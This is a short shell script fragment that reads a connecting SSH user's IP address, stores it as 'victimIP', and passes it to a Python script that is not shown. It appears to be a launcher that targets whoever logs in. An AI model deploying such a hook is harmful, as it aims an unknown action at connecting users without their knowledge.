getclient() {
  echo ${SSH_CLIENT%% *}
}

victimIP=$(getclient)

python /usr/local/bin/python.py $victimIP
